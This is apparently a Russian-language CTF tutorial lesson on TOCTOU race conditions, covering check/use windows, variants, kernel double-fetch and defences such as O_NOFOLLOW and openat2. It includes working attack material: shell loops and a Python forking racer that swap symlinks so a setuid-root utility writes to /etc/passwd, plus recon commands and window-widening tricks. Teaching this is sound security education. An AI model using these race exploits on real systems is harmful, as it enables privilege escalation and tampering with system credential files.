TOCTOU (Time-Of-Check to Time-Of-Use) — класс гонок, в котором программа сначала проверяет условие, а затем использует результат, причём между этими двумя действиями состояние может измениться. Атакующий выигрывает окно и подменяет объект: файл, симлинк, дескриптор или область памяти. Это один из самых «человеческих» классов багов — он не требует переполнения, только неверную модель конкурентности.

В этом уроке мы разберём механику окна, типовые варианты TOCTOU, соберём симлинк-гонку на setuid-утилите и научимся стабилизировать нестабильный результат. Материал опирается на общий модуль `pwn-race-conditions` и подводит к `pwn-thread-races` и `pwn-race-widening`.

## Что такое TOCTOU и почему это класс уязвимостей

Идея проста: код делает `access(path, W_OK)`, а потом `open(path, O_WRONLY)`. Между вызовами путь может указывать на разные объекты. POSIX не гарантирует атомарность двух отдельных системных вызовов, поэтому проверка «протекает». Классический пример из реального мира — `access()` + `open()` в setuid-программах: `access` проверяет права **реального** пользователя, а `open` открывает файл с правами **эффективного** (root). Если между ними подменить путь на симлинк на `/etc/passwd`, root-процесс откроет чужой файл.

Почему это важно в pwn:

- баг не связан с памятью, поэтому его не ловят ASan/stack canary;
- окно может быть очень узким, но детерминированно расширяемым;
- на реальных целях TOCTOU часто даёт повышение привилегий или чтение секретов;
- в CTF это задачи вида «успей подменить файл, пока программа спит».

## Механика: окно между check и use

Представьте временную шкалу:

```
t0: check  — access("/tmp/x", W_OK)  -> разрешено
t1: ...    — окно, в котором атакующий действует
t2: use    — open("/tmp/x", O_WRONLY) -> открывается уже другой объект
```

Чем больше работы между `t0` и `t2` (выделение памяти, ввод-вывод, `sleep`), тем шире окно. Атакующий управляет `t1`: он удаляет `/tmp/x` и создаёт симлинк `/tmp/x -> /etc/shadow`. К моменту `t2` программа откроет уже цель симлинка.

Окно измеряется микросекундами, поэтому в чистом виде гонка срабатывает редко. Практика — расширять окно (см. раздел ниже) или использовать многократные попытки.

## Варианты TOCTOU

| Вариант | Проверка | Использование | Что подменяют |
|---|---|---|---|
| Симлинк-гонка | `access`/`lstat` | `open`/`chmod` | путь на симлинк |
| Гонка на файле | `stat` | `rename`/`unlink` | сам файл |
| Подмена дескриптора | `fstat(fd)` | `read(fd)` | содержимое fd |
| Гонка в памяти | `if (ptr)` | `*ptr` | указатель (double-fetch) |
| Гонка на временном файле | `mkstemp`-имитация | `open` по имени | файл в /tmp |

Особенно опасны **временные файлы с предсказуемым именем**: программа проверяет, что файла нет, создаёт его, и всё это неатомарно. Атакующий подсовывает симлинк на `/etc/passwd`, и root-процесс пишет туда.

## Инструменты и команды

```bash
# ищем пары check/use в бинаре
objdump -d ./chall | grep -E "access@plt|lstat@plt|stat@plt|open@plt|chmod@plt"

# смотрим строки-пути
strings -a ./chall | grep -E "^/tmp|\.tmp|passwd|shadow"

# трассируем файловые операции во времени
strace -f -tt -e trace=access,open,openat,lstat,stat,rename,unlink ./chall 2>&1 | head -40

# проверяем setuid-бит
ls -la ./chall
# -rwsr-xr-x 1 root root ... ./chall

# многопоточная гонка в shell: создаём и удаляем симлинк в цикле
while true; do ln -sf /etc/passwd /tmp/x 2>/dev/null; rm -f /tmp/x; done
```

`strace -tt` печатает таймстемпы, поэтому по разнице между `access` и `open` видно, насколько широко окно. Если между ними есть `read`/`sleep` — окно большое, гонка сработает легко. `ln -sf` в цикле — простейший способ держать «атакующую» сторону занятой подменой.

## Разобранный пример: симлинк-гонка на setuid-утилите

Пусть есть setuid-root утилита:

```c
// backup.c, собран с setuid root
int main(void) {
    char *p = "/tmp/backup";
    if (access(p, F_OK) == 0) { perror("exists"); return 1; }
    int fd = open(p, O_CREAT|O_WRONLY, 0644);
    write(fd, "data", 4);
    return 0;
}
```

Между `access` и `open` мы успеваем подсунуть симлинк:

```bash
# терминал 1 — гоняем утилиту
while true; do ./backup; done

# терминал 2 — подменяем путь
while true; do
    rm -f /tmp/backup
    ln -s /etc/passwd /tmp/backup
done
```

Когда гонка выиграна, root-процесс откроет `/etc/passwd` на запись и перезапишет его (или создаст, если его нет). На практике для «безопасной» демонстрации используют свой файл-маркер:

```bash
# проверяем результат: в файле появились наши данные
grep -a data /tmp/target && echo "RACE WON"
```

Ожидаемый вывод при удачной гонке:

```
RACE WON
```

## Полный эксплойт: стабильная реализация

Ручные `while`-циклы работают, но ненадёжны. Надёжнее — использовать `inotify`, чтобы реагировать ровно в момент, когда утилита создаёт/проверяет файл:

```python
import os, time, subprocess, signal

TARGET = "/tmp/backup"
LINK   = "/tmp/target"   # цель, которую хотим перезаписать

def racer():
    while True:
        try:
            os.symlink(LINK, TARGET)
        except FileExistsError:
            pass
        try:
            os.unlink(TARGET)
        except FileNotFoundError:
            pass

pid = os.fork()
if pid == 0:
    racer()             # дочерний процесс держит гонку
else:
    time.sleep(0.1)
    for _ in range(2000):
        subprocess.run(["./backup"])
    os.kill(pid, signal.SIGKILL)
```

Здесь дочерний процесс непрерывно подменяет путь, а родитель запускает утилиту. Через несколько сотен попыток гонка выигрывается. Для детерминизма можно использовать `inotify`:

```python
import inotify.adapters
i = inotify.adapters.Inotify()
i.add_watch("/tmp")
for event in i.event_gen(yield_nones=False):
    (_, types, path, filename) = event
    if filename == "backup" and "IN_ACCESS" in types:
        # проверка только что произошла — немедленно подменяем
        ...
```

`IN_ACCESS` срабатывает на `access()` — это буквально сигнал «проверка выполнена, окно открыто».

## Расширение и сужение окна

Если гонка не срабатывает:

- **Расширить окно.** Найти в целевом коде `sleep`, `read`, выделение большого буфера между check и use. Иногда достаточно дать программе «подумать».
- **Замедлить цель.** `LD_PRELOAD`-обёртка, которая добавляет задержку в `access`; или `ptrace`-пауза.
- **Ускорить себя.** Убрать лишние syscall из racer-цикла, использовать `inotify` вместо busy-loop.
- **CPU affinity.** `os.sched_setaffinity(0, {0})` — привязать racer к ядру рядом с целью.
- **Повторять.** 2000 попыток — норма для узкого окна.

Если окно не расширяется и гонка не срабатывает за разумное время, это может быть не TOCTOU, а ложная цель. Зафиксируйте результат и переключитесь.

## TOCTOU в памяти: double-fetch

TOCTOU живёт не только на файлах. Если ядро или программа дважды читает значение из пользовательской памяти, атакующий может изменить его между чтениями — это **double-fetch**. Классика: драйвер копирует длину из userspace, проверяет её, а затем читает снова, и второе значение уже больше первого. Результат — переполнение буфера в ядре.

```c
// уязвимый драйвер
if (copy_from_user(&len, uarg, sizeof(len))) return -EFAULT;
if (len > MAX) return -EINVAL;           // check
copy_from_user(buf, uptr, len);          // use — len перечитан? нет, но...
```

Если `len` хранится в userspace и читается повторно, атакующий запускает второй поток, который меняет `len` между проверкой и копированием. Защита — копировать значение **один раз** в локальную переменную ядра и работать только с ней. Ищите в исходниках повторные `copy_from_user`/`get_user` одного и того же поля — это кандидаты на double-fetch.

В user-space аналог — двойное чтение флага или указателя через разделяемую память между потоками. Компилятор может кэшировать значение в регистре, что иногда маскирует баг, а иногда, наоборот, создаёт (при отсутствии `volatile` или барьеров памяти). Всегда думайте, может ли другой поток изменить данные между двумя чтениями. Для эксплуатации double-fetch в ядре часто нужен `userfaultfd`, чтобы заморозить поток в момент второго чтения — это связывает тему с модулем `pwn-race-widening`.

## Частые ошибки

- **Неверный порядок.** Некоторые гонки требуют сначала создать симлинк, потом удалить файл, а не наоборот.
- **Использовать `os.path.exists`.** Между проверкой и `symlink` окно закрывается — race становится медленнее.
- **Забыть про `O_NOFOLLOW`.** Если цель использует `O_NOFOLLOW`, симлинк не сработает; тогда ищите другой объект подмены.
- **Гонять как обычный пользователь.** TOCTOU на setuid-утилите раскрывается только при запуске с теми же правами, что у жертвы.
- **Игнорировать ядро.** Современный Linux имеет `openat2` с `RESOLVE_NO_SYMLINKS`, что закрывает многие симлинк-гонки.

## Что дальше / решение

- Освойте `inotify` — это ключ к детерминированным TOCTOU-эксплойтам.
- Перейдите к `pwn-thread-races` — гонки между потоками и double-fetch.
- Изучите `pwn-race-widening` — `userfaultfd`/FUSE для расширения окна.
- На реальных целях ищите пары `access`/`open` и предсказуемые временные файлы.
